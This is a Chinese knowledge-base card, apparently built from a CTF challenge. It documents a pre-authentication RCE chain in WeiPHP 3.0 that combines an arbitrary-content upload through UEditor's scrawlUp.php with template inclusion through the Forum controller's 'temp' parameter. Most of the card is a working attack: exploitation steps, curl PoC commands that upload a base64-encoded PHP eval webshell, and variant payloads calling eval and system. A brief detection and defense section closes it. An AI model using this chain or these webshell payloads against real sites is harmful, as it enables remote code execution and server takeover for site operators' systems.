---
id: web-php-file-inclusion-weiphp3-ueditor-scrawlup-template-include
title: WeiPHP 3.0 前台 RCE：UEditor scrawlUp 涂鸦上传图片马 + Forum 控制器 temp 模板包含
type: scenario
domain: web
path: web/php/file-inclusion
technique: weiphp3-ueditor-scrawlup-template-include-rce
affected_versions: WeiPHP 3.0
tags:
- php
- weiphp
- thinkphp
- ueditor
- file-upload
- file-inclusion
- template
- rce
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-12'
updated: '2026-11-12'
verification:
  verified_by: verifier-V569
  verified_at: '2026-11-12T09:34:17+08:00'
  notes: 已对照原文与截图01-04核对：static/ueditor 存在、Uploader::__construct(fileField,config,base64) 与 upFile 的 base64 分支、涂鸦上传返回 {'url':'upload/xxxx.png',state:'SUCCESS'} 均一致；Forum temp/display 包含路径与原文 PoC 一致。注意原文代码片段 '!isset([temp]) || $name = I(temp,index)' 与后文 display($temp) 的叙述不一致（疑似原文笔误），卡内按原文利用叙述采用 temp 并标 confidence medium；原文未给最终 flag 实测截图，未复现。
url: /docs/web/php/file-inclusion/web-php-file-inclusion-weiphp3-ueditor-scrawlup-template-include/
draft: false
kb_aliases:
- WeiPHP 3.0 前台 RCE
- UEditor scrawlUp 涂鸦上传
- scrawlUp base64 上传图片马
- ThinkPHP 3.0 display temp 包含
- Forum temp 模板包含
- ueditor 涂鸦 getshell
---

## 一句话结论

WeiPHP 3.0 的 `static/ueditor/php/scrawlUp.php` 在 `action` 为空时走涂鸦上传分支，把 POST `content` 的 base64 内容解码成图片写到可访问目录并返回路径；再借 Forum 控制器 `index` 的 `temp` 参数可控进入 `$this->display($temp)` 模板包含，即可包含刚上传的图片马执行 PHP，形成前台 RCE。

## 原理

- **可控文件写入**：`scrawlUp.php` 用 `$action = htmlspecialchars($_GET["action"])`，当 `$action != "tmpImg"` 时进入涂鸦上传：`new Uploader("content", $config, true)`（第三参数 base64=true）。`Uploader::upFile($base64)` 在 base64 分支执行 `$content = $_POST[$this->fileField]; $this->base64ToImage($content);`，即把请求里的 base64 任意字节解码为图片文件写入临时目录，返回 `{'url':'upload/xxx.png','state':'SUCCESS'}`。文件内容完全可控、后缀固定为图片。
- **模板路径可控**：ThinkPHP 3.0 的 `ForumController::index($name='Forum',$temp='index')` 用 `I('temp','index')` 接收外部参数并赋给模板名，方法末尾 `$this->display($temp)` 直接渲染该模板路径。
- **Sink**：ThinkPHP 3.0 的 `display()` 最终把模板文件交给模板引擎编译/包含，路径未经白名单或目录限制；模板文件（即使是 .png）中的 PHP 代码/模板标签会被执行。
- **为什么能连起来**：上传接口给攻击者"任意内容 + 已知路径"，模板渲染给攻击者"任意文件包含"，两个功能在同一应用内组合即构成完整前台 RCE；同版本 UEditor 还可能存在其它上传/抓取接口，可替换为同类可控写入点。

## 触发条件

- WeiPHP 3.0（ThinkPHP 3.0 内核），`Wei/Public/static/ueditor/php/scrawlUp.php` 可通过 Web 访问（该目录未限制 PHP 执行/访问）；
- Forum 控制器（前台"论坛"功能）可访问，且 `temp` 参数未过滤进入 `display()`；
- 上传目录可写且上传文件可被 Web 访问/包含。

## 利用步骤

1. 确认 UEditor 目录可访问：GET `Wei/Public/static/ueditor/php/scrawlUp.php` 不返回 404。
2. 向 `scrawlUp.php?action=`（action 置空）POST 表单 `content=<base64(一句话木马或 PHP 代码)>`，从响应 JSON 取得 `url`（形如 `upload/202201..6584572056658.png`）。
3. 拼出模板包含路径（原文为相对站点根的 `Public/static/ueditor/php/` + 返回的 `upload/xxx.png`），向 Forum 控制器 POST `temp=<该路径>`。
4. `display($temp)` 编译并执行图片马中的 PHP，写入/直接执行 webshell，读 flag。

## PoC

```bash
# 1) 涂鸦上传（base64 内容为 PHP 代码，文件名/路径由接口返回）
curl -s 'http://target/Wei/Public/static/ueditor/php/scrawlUp.php?action=' \
  --data-urlencode 'content=data:image/png;base64,PD9waHAgZXZhbCgkX1BPU1RbMV0pOz8+'
# 响应示例：{'url':'upload/202201..6584572056658.png',state:'SUCCESS'}

# 2) 模板包含（temp 指向刚上传的文件）
curl -s -X POST 'http://target/index.php/Forum/index' \
  --data 'temp=Public/static/ueditor/php/upload/202201..6584572056658.png'
```

原题演示返回 `{'url':'upload/2022..6584572056658.png',state:'SUCCESS'}`，随后 `temp=Public/static/ueditor/php/上传文件.png` 即可 RCE；具体相对路径前缀需按目标部署（`Wei/Public/...`）调整。

## 变体与关联

- 变体：若模板引擎只执行 `{php}` 等模板标签，把 payload 写成 `{php}eval($_POST[1]);{/php}` 或 `{php}system($_GET[1]);{/php}`。
- 关联：ThinkPHP 5.0.x view() 模板路径包含 [[web-php-file-inclusion-thinkphp-view-template]]（同 sink：模板文件 include；本卡为 TP3.0 display + UEditor 上传）；同产品 5.0 的 templateFile 参数绑定包含见 [[web-php-file-inclusion-weiphp5-templatefile-param-binding-fetch-log]]；UEditor 文件写入变体 [[web-generic-file-upload-ueditor-filepathformat-traversal]]。
- 变体：上传点可换成同版本其它未授权上传/抓取接口，只要能得到"内容可控 + 路径已知"的文件。

## 检测与防御

- 检测：访问 `scrawlUp.php` 且 `action` 为空、`content` 为 base64 的请求；`upload/` 目录出现含 PHP 代码的图片；`temp`/`display` 参数出现 `../`、`Public/static` 或图片路径。
- 防御：删除或禁用 UEditor 的 `php/` 目录及 demo 接口；上传目录禁止 PHP 解析；对模板名做白名单（只允许 `index`、`add` 等固定值）；升级/替换 UEditor 与 WeiPHP。
